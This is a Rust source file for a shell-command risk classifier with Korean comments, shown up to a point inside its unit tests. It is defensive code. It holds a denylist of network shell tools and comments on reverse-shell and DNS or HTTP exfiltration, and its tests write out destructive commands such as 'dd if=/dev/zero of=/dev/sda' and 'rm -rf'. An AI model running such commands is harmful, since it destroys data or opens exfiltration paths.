//! Command risk classifier (P2 'Command Risk Guard').
//!
//! `aic fix`/`aic capture-last`/hook mode 사전 경고 등에서 "이 명령을 실행/재실행해도
//! 안전한가"를 판단하는 공통 모듈이다.
//!
//! 의도:
//! - 정확한 shell 파싱은 목적이 아니다. 위험을 "낮춰 보지 않는다"는 보수적 태도를
//!   기본으로 한다 — 파싱 실패/복잡한 형태는 [`RiskLevel::Unknown`]으로 흐른다.
//! - rule은 builtin denylist 우선, 그 다음 safelist, 마지막으로 Unknown 폴백.
//! - pipeline (`|`), 다중 statement (`;`/`&&`/`||`), subshell (`$()`/`` ` `` `)는
//!   각 segment 중 가장 위험한 결과를 채택하며 subshell은 항상 Unknown.

use std::collections::HashSet;

/// 명령의 위험 등급.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RiskLevel {
    /// 읽기 전용 또는 formatting처럼 낮은 위험. `--yes` 자동 진행 허용.
    Safe,
    /// 파일 변경/dependency install/network write — 사용자 확인 필요.
    NeedsConfirm,
    /// destructive/irreversible. `--yes`도 통하지 않아야 한다.
    Dangerous,
    /// 파싱 실패 또는 분류 불가 — 호출자는 보수적으로 처리.
    Unknown,
}

impl RiskLevel {
    /// `--yes`로 자동 진행해도 되는 등급인지.
    pub fn allows_auto_confirm(self) -> bool {
        matches!(self, RiskLevel::Safe)
    }

    /// 두 위험 중 더 높은 쪽을 반환한다.
    pub fn max(self, other: RiskLevel) -> RiskLevel {
        if self.severity() >= other.severity() {
            self
        } else {
            other
        }
    }

    fn severity(self) -> u8 {
        match self {
            RiskLevel::Safe => 0,
            RiskLevel::NeedsConfirm => 1,
            RiskLevel::Unknown => 2,
            RiskLevel::Dangerous => 3,
        }
    }
}

/// 분류 결과. 사용자에게 표시할 사유와 매칭된 rule id를 함께 돌려준다.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RiskAssessment {
    pub level: RiskLevel,
    pub reason: Option<String>,
    pub rule: Option<&'static str>,
}

impl RiskAssessment {
    fn dangerous(rule: &'static str, reason: impl Into<String>) -> Self {
        Self {
            level: RiskLevel::Dangerous,
            reason: Some(reason.into()),
            rule: Some(rule),
        }
    }
    fn needs_confirm(rule: &'static str, reason: impl Into<String>) -> Self {
        Self {
            level: RiskLevel::NeedsConfirm,
            reason: Some(reason.into()),
            rule: Some(rule),
        }
    }
    fn safe(rule: &'static str) -> Self {
        Self {
            level: RiskLevel::Safe,
            reason: None,
            rule: Some(rule),
        }
    }
    fn unknown(reason: impl Into<String>) -> Self {
        Self {
            level: RiskLevel::Unknown,
            reason: Some(reason.into()),
            rule: None,
        }
    }
}

/// 명령 텍스트의 위험을 분류한다.
///
/// 동작:
/// 1. multi-statement/pipeline 분리 — `;`, `&&`, `||`, `|` 단위로 segment 나눔.
/// 2. subshell(`$(...)`/backtick), redirect target이 `/etc`/`/dev` 등 시스템 경로면
///    Dangerous 또는 Unknown.
/// 3. 각 segment 분류 → 최댓값 반환.
pub fn classify(command: &str) -> RiskAssessment {
    classify_with_extra_denylist(command, &[])
}

/// `extra_dangerous`에 사용자 config로 확장한 dangerous 명령 prefix(공백 포함)
/// 목록을 넣으면 builtin rule보다 우선해서 매칭한다.
pub fn classify_with_extra_denylist(command: &str, extra_dangerous: &[String]) -> RiskAssessment {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return RiskAssessment::unknown("빈 명령");
    }

    // subshell 또는 backtick은 정확한 분석이 어려워 Unknown로 단호히 떨어뜨린다.
    if contains_unbounded_substitution(trimmed) {
        return RiskAssessment::unknown("subshell/backtick 포함 — 정적 분석 한계");
    }

    let segments = split_top_level(trimmed);
    if segments.is_empty() {
        return RiskAssessment::unknown("파싱 실패");
    }

    let mut worst = RiskAssessment {
        level: RiskLevel::Safe,
        reason: None,
        rule: None,
    };
    for seg in segments {
        let asm = classify_single(seg.trim(), extra_dangerous);
        if asm.level.severity() > worst.level.severity() {
            worst = asm;
        }
    }
    worst
}

fn contains_unbounded_substitution(cmd: &str) -> bool {
    // backtick 사용은 곧 subshell.
    if cmd.contains('`') {
        return true;
    }
    // $(...)는 paren depth로 본다 — 단순한 $( cmd ) 패턴은 잡힌다.
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i + 1 < bytes.len() {
        if bytes[i] == b'$' && bytes[i + 1] == b'(' {
            return true;
        }
        i += 1;
    }
    false
}

/// top-level statement/pipeline separator로 분리 — 따옴표 안의 separator는 무시.
fn split_top_level(cmd: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let bytes = cmd.as_bytes();
    let mut start = 0;
    let mut i = 0;
    let mut quote: Option<u8> = None;

    while i < bytes.len() {
        let b = bytes[i];
        match quote {
            Some(q) => {
                // POSIX: single-quote 안에서는 어떤 escape도 발생하지 않는다.
                // double-quote 안에서만 backslash escape 적용.
                if q == b'"' && b == b'\\' && i + 1 < bytes.len() {
                    i += 2;
                    continue;
                }
                if b == q {
                    quote = None;
                }
                i += 1;
            }
            None => {
                if b == b'\'' || b == b'"' {
                    quote = Some(b);
                    i += 1;
                    continue;
                }
                if b == b'\\' && i + 1 < bytes.len() {
                    i += 2;
                    continue;
                }
                if b == b';' || b == b'|' || b == b'&' {
                    // ;, &&, ||, | 모두 분리 — single & (background)도 분리.
                    let cut = i;
                    let next = bytes.get(i + 1).copied();
                    let consume =
                        if (b == b'|' && next == Some(b'|')) || (b == b'&' && next == Some(b'&')) {
                            2
                        } else {
                            1
                        };
                    out.push(&cmd[start..cut]);
                    i += consume;
                    start = i;
                    continue;
                }
                i += 1;
            }
        }
    }
    if start < cmd.len() {
        out.push(&cmd[start..]);
    }
    out.into_iter().filter(|s| !s.trim().is_empty()).collect()
}

fn classify_single(segment: &str, extra_dangerous: &[String]) -> RiskAssessment {
    if segment.is_empty() {
        return RiskAssessment::unknown("빈 segment");
    }

    // redirect target이 시스템 경로면 위험.
    if let Some(asm) = classify_redirect(segment) {
        return asm;
    }

    // env prefix (`FOO=bar cmd ...`) 제거 — A=B 형태가 첫 토큰이면 건너뛴다.
    let stripped = strip_env_prefix(segment);

    // sudo/doas/env prefix는 권한 escalation을 동반하므로 제거 후 본 명령을 분류한다.
    // 단, 등급은 최소 NeedsConfirm로 고정해 "어떤 명령이든 sudo로는 더 위험하다"는
    // floor를 둔다.
    let (after_sudo, sudo_used) = strip_privilege_prefix(stripped);
    let tokens = match tokenize(after_sudo) {
        Some(t) if !t.is_empty() => t,
        _ => return RiskAssessment::unknown("토큰화 실패"),
    };

    // base name 단위로 매칭 (e.g. /usr/local/bin/git → git).
    let head_full = tokens[0].as_str();
    let head = base_name(head_full);
    let rest: Vec<&str> = tokens.iter().skip(1).map(String::as_str).collect();

    // 사용자 정의 denylist 우선.
    let lowered = stripped.trim_start().to_lowercase();
    for entry in extra_dangerous {
        let needle = entry.trim().to_lowercase();
        if !needle.is_empty() && lowered.starts_with(&needle) {
            return RiskAssessment::dangerous(
                "config.dangerous",
                format!("사용자 정의 dangerous rule과 일치 ('{entry}')"),
            );
        }
    }

    // ── Dangerous rules ────────────────────────────────────────────
    if let Some(asm) = match_dangerous(head, &rest) {
        return asm;
    }
    // ── Safe rules (sudo 동반 시는 floor에 따라 NeedsConfirm로 끌어올림) ──
    if let Some(mut asm) = match_safe(head, &rest) {
        if sudo_used {
            asm = RiskAssessment::needs_confirm(
                "sudo.privilege_escalation",
                format!("sudo 동반 — 권한 escalation 명령 ({head})"),
            );
        }
        return asm;
    }
    // ── NeedsConfirm rules ─────────────────────────────────────────
    if let Some(asm) = match_needs_confirm(head, &rest) {
        return asm;
    }

    if sudo_used {
        return RiskAssessment::needs_confirm(
            "sudo.privilege_escalation",
            format!("sudo 동반 — 분류되지 않은 명령 ({head})"),
        );
    }
    RiskAssessment::unknown(format!("분류 룰에 매칭되지 않음 ('{head}')"))
}

/// `sudo`/`doas`/`env` prefix를 strip하고 동반 여부를 반환한다.
/// 옵션이 붙은 형태(`sudo -E`, `sudo -u user`)는 가장 단순한 케이스만 다루며,
/// 잘 모르는 옵션은 그대로 두고 head로 매칭되도록 한다.
fn strip_privilege_prefix(segment: &str) -> (&str, bool) {
    let mut rest = segment.trim_start();
    let mut used = false;
    loop {
        let head = rest.split_whitespace().next().unwrap_or("");
        let head_base = base_name(head);
        if matches!(head_base, "sudo" | "doas") {
            used = true;
            rest = rest[head.len()..].trim_start();
            // sudo 단순 옵션 한두 개를 추가로 건너뛴다 (-E, -H, -n 등).
            // 옵션 인자가 있는 형태(-u user, -g group)도 best-effort로 처리.
            loop {
                let next = rest.split_whitespace().next().unwrap_or("");
                if next.starts_with("--") && !next.contains('=') {
                    rest = rest[next.len()..].trim_start();
                    continue;
                }
                if next.starts_with('-') && next.len() <= 3 {
                    rest = rest[next.len()..].trim_start();
                    // -u/-g/-U는 다음 토큰이 인자.
                    if matches!(next, "-u" | "-g" | "-U") {
                        let arg = rest.split_whitespace().next().unwrap_or("");
                        if !arg.is_empty() {
                            rest = rest[arg.len()..].trim_start();
                        }
                    }
                    continue;
                }
                break;
            }
            continue;
        }
        if head_base == "env" {
            // `env VAR=val cmd ...` 형태 — env prefix만 떼고 자연스럽게 strip_env_prefix가
            // 처리하도록 함. env 자체는 권한 escalation이 아니므로 sudo flag는 두지 않음.
            rest = rest[head.len()..].trim_start();
            // env 뒤의 KEY=VAL 토큰을 strip_env_prefix가 다시 정리하도록 그대로 둔다.
            return (rest, used);
        }
        return (rest, used);
    }
}

fn classify_redirect(segment: &str) -> Option<RiskAssessment> {
    // 따옴표 밖에서 > 또는 >>가 시스템 경로로 향하면 Dangerous.
    let bytes = segment.as_bytes();
    let mut i = 0;
    let mut quote: Option<u8> = None;
    while i < bytes.len() {
        let b = bytes[i];
        match quote {
            Some(q) => {
                // POSIX: single-quote 안에서는 escape 없음.
                if q == b'"' && b == b'\\' && i + 1 < bytes.len() {
                    i += 2;
                    continue;
                }
                if b == q {
                    quote = None;
                }
                i += 1;
            }
            None => {
                if b == b'\'' || b == b'"' {
                    quote = Some(b);
                    i += 1;
                    continue;
                }
                if b == b'>' {
                    let target = segment[i + 1..].trim_start_matches('>').trim_start();
                    let target_first = target.split_whitespace().next().unwrap_or("");
                    if is_system_path(target_first) {
                        return Some(RiskAssessment::dangerous(
                            "redirect.system_path",
                            format!("시스템 경로로의 redirect: '{target_first}'"),
                        ));
                    }
                }
                i += 1;
            }
        }
    }
    None
}

fn is_system_path(s: &str) -> bool {
    let s = s.trim_matches(|c| c == '\'' || c == '"');
    s.starts_with("/etc/")
        || s == "/etc"
        || s.starts_with("/dev/")
        || s == "/dev/sda"
        || s.starts_with("/boot/")
        || s.starts_with("/sys/")
        || s.starts_with("/proc/")
}

fn strip_env_prefix(segment: &str) -> &str {
    let trimmed = segment.trim_start();
    let mut rest = trimmed;
    loop {
        let head = rest.split_whitespace().next().unwrap_or("");
        if head.is_empty() {
            return rest;
        }
        if let Some(eq) = head.find('=') {
            let name = &head[..eq];
            if !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                rest = rest[head.len()..].trim_start();
                continue;
            }
        }
        return rest;
    }
}

fn tokenize(segment: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let bytes = segment.as_bytes();
    let mut i = 0;
    let mut quote: Option<u8> = None;
    let mut in_token = false;

    while i < bytes.len() {
        let b = bytes[i];
        match quote {
            Some(q) => {
                // POSIX: single-quote 안에서는 escape 없이 모든 문자가 리터럴.
                if q == b'"' && b == b'\\' && i + 1 < bytes.len() {
                    cur.push(bytes[i + 1] as char);
                    i += 2;
                    continue;
                }
                if b == q {
                    quote = None;
                    i += 1;
                    continue;
                }
                cur.push(b as char);
                i += 1;
            }
            None => {
                if b.is_ascii_whitespace() {
                    if in_token {
                        out.push(std::mem::take(&mut cur));
                        in_token = false;
                    }
                    i += 1;
                    continue;
                }
                if b == b'\'' || b == b'"' {
                    quote = Some(b);
                    in_token = true;
                    i += 1;
                    continue;
                }
                if b == b'\\' && i + 1 < bytes.len() {
                    cur.push(bytes[i + 1] as char);
                    in_token = true;
                    i += 2;
                    continue;
                }
                cur.push(b as char);
                in_token = true;
                i += 1;
            }
        }
    }
    if quote.is_some() {
        return None;
    }
    if in_token {
        out.push(cur);
    }
    Some(out)
}

fn base_name(token: &str) -> &str {
    token.rsplit('/').next().unwrap_or(token)
}

// ── Rule helpers ──────────────────────────────────────────────────

fn has_flag(args: &[&str], flag: &str) -> bool {
    args.iter()
        .any(|a| *a == flag || a.starts_with(&format!("{flag}=")))
}

fn first_subcommand<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|a| !a.starts_with('-')).copied()
}

/// 두 번째 non-flag 토큰(예: `docker system df`의 `df`). flag/옵션은 건너뛴다.
fn second_subcommand<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().filter(|a| !a.starts_with('-')).nth(1).copied()
}

fn match_dangerous(head: &str, args: &[&str]) -> Option<RiskAssessment> {
    match head {
        // 원격 접속/임의 네트워크 도구는 명시적으로 Dangerous(차단) — Unknown 의존 금지.
        // 원격 명령 실행/역방향 셸/임의 소켓을 통한 exfil·침투 표면을 차단한다.
        "ssh" | "scp" | "sftp" | "nc" | "ncat" | "netcat" | "socat" | "telnet" | "rsh"
        | "rlogin" => Some(RiskAssessment::dangerous(
            "net.remote_access",
            format!("원격 접속/임의 네트워크 도구 ({head}) — 차단"),
        )),
        "rm" => {
            // recursive 삭제는 -f 동반 여부와 무관하게 Dangerous로 판정한다 — 비대화형
            // 환경(`$SHELL -c`)에서 재실행하면 prompt가 의미를 잃기 때문이다.
            let recursive = has_flag(args, "-r")
                || has_flag(args, "-R")
                || has_flag(args, "--recursive")
                || has_flag(args, "-rf")
                || has_flag(args, "-fr")
                || has_flag(args, "-rR")
                || has_flag(args, "-Rr");
            if recursive {
                return Some(RiskAssessment::dangerous(
                    "rm.recursive",
                    "재귀 삭제는 복구 불가 — 비대화형 재실행에서 prompt가 의미 없다",
                ));
            }
            // 단순 rm은 NeedsConfirm로 처리(아래 fallthrough에서).
            None
        }
        "git" => match first_subcommand(args) {
            Some("push") => {
                if has_flag(args, "--force")
                    || has_flag(args, "-f")
                    || has_flag(args, "--force-with-lease")
                {
                    Some(RiskAssessment::dangerous(
                        "git.push_force",
                        "force push는 원격 history를 덮어쓴다",
                    ))
                } else {
                    None
                }
            }
            Some("reset") => {
                if has_flag(args, "--hard") {
                    Some(RiskAssessment::dangerous(
                        "git.reset_hard",
                        "git reset --hard는 작업 트리 변경을 모두 버린다",
                    ))
                } else {
                    None
                }
            }
            Some("clean") => {
                if has_flag(args, "-f") || has_flag(args, "--force") || has_flag(args, "-fd") {
                    Some(RiskAssessment::dangerous(
                        "git.clean_force",
                        "git clean -f는 untracked 파일을 영구 삭제한다",
                    ))
                } else {
                    None
                }
            }
            Some("checkout") | Some("restore") => {
                if args.iter().any(|a| *a == "." || *a == "--") {
                    Some(RiskAssessment::dangerous(
                        "git.checkout_dot",
                        "현재 변경을 모두 버리는 형태",
                    ))
                } else {
                    None
                }
            }
            _ => None,
        },
        "kubectl" => match first_subcommand(args) {
            Some("delete") => Some(RiskAssessment::dangerous(
                "kubectl.delete",
                "kubectl delete는 cluster 자원을 제거한다",
            )),
            Some("apply") if has_flag(args, "--prune") => Some(RiskAssessment::dangerous(
                "kubectl.apply_prune",
                "--prune은 매니페스트에 없는 자원을 삭제한다",
            )),
            _ => None,
        },
        "terraform" => match first_subcommand(args) {
            Some("apply") | Some("destroy") => Some(RiskAssessment::dangerous(
                "terraform.mutate",
                "terraform apply/destroy는 infra 상태를 변경한다",
            )),
            _ => None,
        },
        "docker" => {
            // 강제 제거(`-f`): docker rm/rmi/system -f — 복구 불가.
            if has_flag(args, "-f")
                && matches!(first_subcommand(args), Some("rm" | "rmi" | "system"))
            {
                return Some(RiskAssessment::dangerous(
                    "docker.force_remove",
                    "docker 강제 제거는 복구 불가",
                ));
            }
            // prune: `docker prune` 또는 `docker <area> prune` — 미사용 리소스 삭제(복구 불가).
            // `-f` 없이도 삭제하므로 Dangerous로 분류해 자동 실행을 막는다.
            let is_prune = first_subcommand(args) == Some("prune")
                || (matches!(
                    first_subcommand(args),
                    Some("system" | "image" | "container" | "volume" | "network" | "builder")
                ) && second_subcommand(args) == Some("prune"));
            if is_prune {
                return Some(RiskAssessment::dangerous(
                    "docker.prune",
                    "docker prune은 미사용 리소스를 삭제(복구 불가)",
                ));
            }
            None
        }
        "npm" | "pnpm" | "yarn" => match first_subcommand(args) {
            Some("publish") => Some(RiskAssessment::dangerous(
                "npm.publish",
                "package publish는 외부에 영구 공개된다",
            )),
            _ => None,
        },
        "dd" => Some(RiskAssessment::dangerous(
            "dd.raw_io",
            "dd는 디스크/디바이스를 직접 덮어쓸 수 있다",
        )),
        "mkfs" | "mkfs.ext4" | "mkfs.xfs" | "mkfs.btrfs" => Some(RiskAssessment::dangerous(
            "mkfs",
            "파일시스템 포맷은 데이터를 모두 지운다",
        )),
        "shutdown" | "reboot" | "halt" | "poweroff" => Some(RiskAssessment::dangerous(
            "system.power",
            "시스템 종료/재시작",
        )),
        _ => None,
    }
}

/// DNS 도구(dig/nslookup/host)가 기본 resolver가 아닌 custom resolver/explicit server를
/// 지정했는지. 지정 시 임의 서버로의 DNS exfil이 가능하므로 NeedsConfirm으로 올린다.
/// 기본 resolver 단순 조회(`dig name`, `nslookup name`, `host name`)는 false(Safe 유지).
fn dns_uses_custom_resolver(head: &str, args: &[&str]) -> bool {
    match head {
        // `dig @server name` — `@`로 시작하는 인자가 explicit server.
        "dig" => args.iter().any(|a| a.starts_with('@')),
        // `nslookup name server` — 옵션(`-opt`/`-opt=val`)은 단일 토큰이므로 positional 2개↑면 server 지정.
        "nslookup" => args.iter().filter(|a| !a.starts_with('-')).count() >= 2,
        // `host [options] name [server]` — 값 받는 옵션(-t/-c/-N/-W/-R/-m)의 값 토큰은 건너뛰고
        // positional 2개↑(name + server)면 explicit server.
        "host" => {
            let mut positionals = 0usize;
            let mut i = 0;
            while i < args.len() {
                let a = args[i];
                if a.starts_with('-') {
                    let takes_val =
                        matches!(a, "-t" | "-c" | "-N" | "-W" | "-R" | "-m") && !a.contains('=');
                    i += if takes_val { 2 } else { 1 };
                    continue;
                }
                positionals += 1;
                i += 1;
            }
            positionals >= 2
        }
        _ => false,
    }
}

/// `sysctl`이 커널 파라미터를 변경하는 write 형태인지(`-w` 또는 `key=value`). 읽기 전용 조회는 false.
fn sysctl_is_write(args: &[&str]) -> bool {
    args.iter()
        .any(|a| *a == "-w" || (!a.starts_with('-') && a.contains('=')))
}

/// curl/wget args에 write/upload/output(=네트워크 쓰기 또는 파일 출력) 플래그가 있는지.
/// 없으면 GET류(읽기/egress)로 본다. 둘 다 NeedsConfirm이지만 사유/rule을 구분한다.
fn curl_has_write_flag(args: &[&str]) -> bool {
    args.iter().any(|a| {
        let h = a.split('=').next().unwrap_or(*a);
        let exact = matches!(
            h,
            "-X" | "--request"
                | "-d"
                | "--data"
                | "--data-raw"
                | "--data-binary"
                | "--data-urlencode"
                | "-F"
                | "--form"
                | "-T"
                | "--upload-file"
                | "-O"
                | "--remote-name"
                | "-o"
                | "--output"
                | "--post-file"
                | "--post-data"
        );
        // `-O-`/`-Ofile`/`-ofile`처럼 short flag에 값이 붙은 형태도 output으로 본다.
        let prefix_o = (h.starts_with("-O") || h.starts_with("-o")) && h.len() > 2;
        exact || prefix_o
    })
}

fn match_needs_confirm(head: &str, args: &[&str]) -> Option<RiskAssessment> {
    let needs_confirm_heads: &[&str] = &[
        "rm",
        "mv",
        "cp",
        "chmod",
        "chown",
        "kill",
        "pkill",
        "killall",
        "make",
        "systemctl",
        "service",
    ];
    if needs_confirm_heads.contains(&head) {
        return Some(RiskAssessment::needs_confirm(
            "fs.mutation",
            format!("파일/프로세스 변경 명령 ({head})"),
        ));
    }
    // curl/wget은 GET 포함 모든 네트워크 요청을 NeedsConfirm으로 본다(G2: egress/exfil).
    // GET 자동실행 시 쿼리스트링을 통한 데이터 유출(prompt-injection 자동화)이 가능하므로
    // 비-TTY에서는 confirm이 거부되어 실행되지 않는다. POST/upload/output은 더 명확한 write.
    if head == "curl" || head == "wget" {
        if curl_has_write_flag(args) {
            return Some(RiskAssessment::needs_confirm(
                "http.write",
                format!("{head}이(가) write/upload/output 플래그를 사용합니다"),
            ));
        }
        return Some(RiskAssessment::needs_confirm(
            "http.egress",
            format!(
                "{head} 네트워크 egress(GET 포함) — 쿼리스트링 등으로 데이터 유출 가능, 확인 필요"
            ),
        ));
    }
    // DNS custom resolver/explicit server — 임의 서버로의 DNS exfil 방지(기본 resolver는 Safe).
    if matches!(head, "dig" | "nslookup" | "host") && dns_uses_custom_resolver(head, args) {
        return Some(RiskAssessment::needs_confirm(
            "dns.custom_resolver",
            format!(
                "{head}이(가) custom resolver/explicit server 지정 — DNS exfil 가능, 확인 필요"
            ),
        ));
    }
    if matches!(head, "npm" | "pnpm" | "yarn") {
        if let Some("install" | "i" | "add" | "remove" | "uninstall" | "update" | "upgrade") =
            first_subcommand(args)
        {
            return Some(RiskAssessment::needs_confirm(
                "npm.mutate",
                "dependency tree 변경",
            ));
        }
    }
    if head == "cargo" {
        if let Some("install" | "uninstall" | "update" | "publish") = first_subcommand(args) {
            return Some(RiskAssessment::needs_confirm(
                "cargo.mutate",
                "cargo 상태 변경",
            ));
        }
    }
    if head == "git" {
        if let Some("commit" | "push" | "pull" | "merge" | "rebase" | "stash" | "tag" | "fetch") =
            first_subcommand(args)
        {
            return Some(RiskAssessment::needs_confirm("git.mutate", "git 상태 변경"));
        }
    }
    if head == "docker" {
        if let Some("run" | "start" | "stop" | "kill" | "restart" | "build" | "pull" | "compose") =
            first_subcommand(args)
        {
            return Some(RiskAssessment::needs_confirm(
                "docker.mutate",
                "docker 상태 변경",
            ));
        }
    }
    None
}

fn match_safe(head: &str, args: &[&str]) -> Option<RiskAssessment> {
    let safe_set: HashSet<&str> = [
        "ls",
        "ll",
        "la",
        "cat",
        "less",
        "more",
        "head",
        "tail",
        "echo",
        "pwd",
        "whoami",
        "id",
        "date",
        "uptime",
        "uname",
        "hostname",
        "env",
        "printenv",
        "which",
        "type",
        "command",
        "history",
        "tree",
        "stat",
        "file",
        "wc",
        "grep",
        "rg",
        "ag",
        "find",
        "fd",
        "locate",
        "diff",
        "cmp",
        "df",
        "du",
        "free",
        "sysctl",
        "ps",
        "top",
        "htop",
        "lsof",
        "netstat",
        "ss",
        "ip",
        "ifconfig",
        "route",
        "ping",
        "traceroute",
        "dig",
        "nslookup",
        "host",
        "jq",
        "yq",
        "xxd",
        "base64",
        // 순수 텍스트 필터(stdin→stdout, 부작용 없음). awk/sed는 코드 실행(system()/e)
        // 가능성 때문에 의도적으로 제외한다.
        "sort",
        "uniq",
        "cut",
        "tr",
        "column",
        "comm",
        // macOS 메모리 read-only 조회(SRE_PREFACE가 mem 진단에 사용).
        "vm_stat",
    ]
    .iter()
    .copied()
    .collect();
    // sort/uniq의 `-o`/`--output`은 파일 쓰기 → Safe(자동 실행)에서 제외(파이프 stdin 필터만 Safe).
    if matches!(head, "sort" | "uniq")
        && args.iter().any(|a| {
            *a == "-o" || a.starts_with("--output") || (a.starts_with("-o") && a.len() > 2)
        })
    {
        return None;
    }
    // DNS 도구가 custom resolver/explicit server를 쓰면 Safe 자동실행에서 제외한다
    // (DNS exfil 축소 — match_needs_confirm의 dns.custom_resolver가 받는다).
    if matches!(head, "dig" | "nslookup" | "host") && dns_uses_custom_resolver(head, args) {
        return None;
    }
    // sysctl이 write 형태(`-w` 또는 `key=value`)면 Safe 자동실행에서 제외(커널 파라미터 변경 방지).
    // 읽기 전용 조회(`sysctl kern.num_files` 등)만 Safe로 유지한다.
    if head == "sysctl" && sysctl_is_write(args) {
        return None;
    }
    if safe_set.contains(head) {
        return Some(RiskAssessment::safe("safe.readonly"));
    }
    // curl/wget은 GET을 포함해 Safe(자동 실행)로 두지 않는다(G2: egress/exfil 위험).
    // 모든 네트워크 요청을 match_needs_confirm으로 흘려보내 GET=http.egress / write=http.write로
    // NeedsConfirm 분류한다.
    if head == "curl" || head == "wget" {
        return None;
    }
    if head == "git" {
        if let Some(
            "status" | "log" | "diff" | "show" | "branch" | "tag" | "blame" | "ls-files"
            | "ls-tree" | "config" | "remote" | "rev-parse" | "describe",
        ) = first_subcommand(args)
        {
            return Some(RiskAssessment::safe("git.read"));
        }
    }
    if head == "cargo" {
        if let Some("fmt" | "check" | "clippy" | "build" | "test" | "tree" | "metadata" | "doc") =
            first_subcommand(args)
        {
            return Some(RiskAssessment::safe("cargo.read"));
        }
    }
    if head == "npm" || head == "pnpm" || head == "yarn" {
        if let Some("test" | "run" | "list" | "ls" | "outdated" | "audit") = first_subcommand(args)
        {
            return Some(RiskAssessment::safe("npm.read"));
        }
    }
    if head == "kubectl" {
        if let Some("get" | "describe" | "logs" | "config" | "version" | "explain") =
            first_subcommand(args)
        {
            return Some(RiskAssessment::safe("kubectl.read"));
        }
    }
    if head == "docker" {
        if let Some(
            "ps" | "images" | "logs" | "inspect" | "version" | "info" | "diff" | "history",
        ) = first_subcommand(args)
        {
            return Some(RiskAssessment::safe("docker.read"));
        }
        // `docker system df`(디스크 사용량 읽기)만 Safe. system prune/events 등은 제외(위 prune은 Dangerous).
        if first_subcommand(args) == Some("system") && second_subcommand(args) == Some("df") {
            return Some(RiskAssessment::safe("docker.read"));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn lvl(cmd: &str) -> RiskLevel {
        classify(cmd).level
    }

    #[test]
    fn empty_command_is_unknown() {
        assert_eq!(lvl(""), RiskLevel::Unknown);
        assert_eq!(lvl("   "), RiskLevel::Unknown);
    }

    #[test]
    fn safe_readonly_commands() {
        for cmd in [
            "ls -la",
            "cat README.md",
            "grep foo bar.txt",
            "git status",
            "git log --oneline",
            "cargo build",
            "cargo check",
            "kubectl get pods",
            "docker ps",
            "/usr/bin/ls /tmp",
        ] {
            assert_eq!(lvl(cmd), RiskLevel::Safe, "expected Safe for '{cmd}'");
        }
    }

    #[test]
    fn sysctl_read_safe_write_not() {
        // 읽기 전용 조회는 Safe(자동 실행 가능) — `/local` fd probe가 의존.
        assert_eq!(
            lvl("sysctl kern.num_files kern.maxfiles"),
            RiskLevel::Safe
        );
        assert_eq!(lvl("sysctl -a"), RiskLevel::Safe);
        // write 형태(`-w` 또는 key=value)는 Safe가 아니다(커널 파라미터 변경 → 자동 실행 금지).
        assert_ne!(lvl("sysctl -w kern.maxfiles=400000"), RiskLevel::Safe);
        assert_ne!(lvl("sysctl kern.maxfiles=400000"), RiskLevel::Safe);
    }

    #[test]
    fn docker_read_safe_prune_dangerous() {
        // 읽기 전용은 Safe(자동 실행 — catalog docker probe가 의존).
        assert_eq!(lvl("docker system df"), RiskLevel::Safe);
        assert_eq!(lvl("docker ps -s"), RiskLevel::Safe);
        assert_eq!(lvl("docker images"), RiskLevel::Safe);
        // prune/force-remove는 삭제(복구 불가) → Dangerous, 자동 실행 금지.
        assert_eq!(lvl("docker system prune"), RiskLevel::Dangerous);
        assert_eq!(lvl("docker image prune -f"), RiskLevel::Dangerous);
        assert_eq!(lvl("docker volume prune"), RiskLevel::Dangerous);
        assert_eq!(lvl("docker rmi -f img"), RiskLevel::Dangerous);
        // system의 df가 아닌 하위(events 등)는 Safe가 아니다(자동 실행 금지).
        assert_ne!(lvl("docker system events"), RiskLevel::Safe);
    }

    #[test]
    fn dangerous_rm_rf() {
        assert_eq!(lvl("rm -rf /tmp/foo"), RiskLevel::Dangerous);
        assert_eq!(lvl("rm -fr /tmp/foo"), RiskLevel::Dangerous);
        assert_eq!(lvl("rm -r -f x"), RiskLevel::Dangerous);
    }

    #[test]
    fn dangerous_git_force_push() {
        assert_eq!(lvl("git push --force"), RiskLevel::Dangerous);
        assert_eq!(lvl("git push -f origin main"), RiskLevel::Dangerous);
        assert_eq!(
            lvl("git push --force-with-lease origin main"),
            RiskLevel::Dangerous
        );
        // 일반 push는 NeedsConfirm.
        assert_eq!(lvl("git push origin main"), RiskLevel::NeedsConfirm);
    }

    #[test]
    fn dangerous_kubectl_delete_and_terraform() {
        assert_eq!(lvl("kubectl delete pod foo"), RiskLevel::Dangerous);
        assert_eq!(lvl("kubectl apply --prune -f ."), RiskLevel::Dangerous);
        assert_eq!(lvl("terraform apply -auto-approve"), RiskLevel::Dangerous);
        assert_eq!(lvl("terraform destroy"), RiskLevel::Dangerous);
    }

    #[test]
    fn dangerous_publish_dd_mkfs_power() {
        assert_eq!(lvl("npm publish"), RiskLevel::Dangerous);
        assert_eq!(lvl("dd if=/dev/zero of=/dev/sda"), RiskLevel::Dangerous);
        assert_eq!(lvl("mkfs.ext4 /dev/sdb1"), RiskLevel::Dangerous);
        assert_eq!(lvl("shutdown -h now"), RiskLevel::Dangerous);
    }

    #[test]
    fn needs_confirm_mutations() {
        assert_eq!(lvl("npm install"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("cargo update -p foo"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("git commit -m 'msg'"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("docker run -it ubuntu"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("mv a b"), RiskLevel::NeedsConfirm);
        assert_eq!(lvl("rm tmpfile"), RiskLevel::NeedsConfirm);
    }

    #[test]
    fn pipeline_takes_max_risk() {
        // git status (Safe) | grep foo (Safe) → Safe.
        assert_eq!(lvl("git status | grep foo"), RiskLevel::Safe);
        // ls (Safe) && rm -rf x (Dangerous) → Dangerous.
        assert_eq!(lvl("ls && rm -rf /tmp/x"), RiskLevel::Dangerous);
        // npm install (NeedsConfirm) ; npm test (Safe) → NeedsConfirm.
